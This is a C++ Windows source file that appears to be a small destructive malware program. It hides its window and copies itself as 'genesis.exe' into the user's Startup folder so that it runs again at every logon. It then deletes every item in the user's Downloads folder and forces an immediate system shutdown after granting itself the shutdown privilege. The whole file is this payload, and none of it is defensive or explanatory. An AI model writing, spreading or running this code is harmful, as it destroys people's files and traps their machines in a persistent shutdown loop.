#include "Header.h"

int APIENTRY wWinMain(HINSTANCE Instance, //no window
	HINSTANCE hPreInstance,
	LPTSTR    lpCmdLine,
	int		  nCmdShow) {

	char* userdatapath = getenv("APPDATA"); //get %appdata% path
	std::string datapath;
	datapath = std::string(userdatapath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; //full startup path
	char filename[MAX_PATH] = "genesis.exe";
	char newLocation[77];
	strcpy(newLocation, datapath.c_str());

	if (std::filesystem::exists(datapath + "\\genesis.exe") != true) { //exit if genesis.exe exists in dir
		std::filesystem::copy(filename, newLocation);
	}
	
	char* userpath = getenv("USERPROFILE"); //get %userprofile% path
	std::string path;

	if (userpath != nullptr) {
		path = std::string(userpath) + "\\Downloads"; //sets full directory path

	}
	//removes files under dir recusivly
	void deleteDirectoryContents(const std::string & path); {
		for (const auto& entry : std::filesystem::directory_iterator(path)) {

			std::filesystem::remove_all(entry.path());

		}
	}

	HANDLE hToken = NULL;
	LUID luid;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken); //gives current process shutdown priv
	LookupPrivilegeValue(L"", SE_SHUTDOWN_NAME, &luid);
	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, 0);

	InitiateSystemShutdownExA(NULL, NULL, 0, true, false, SHTDN_REASON_MINOR_OTHER); //shuts down computer
	return 0;
}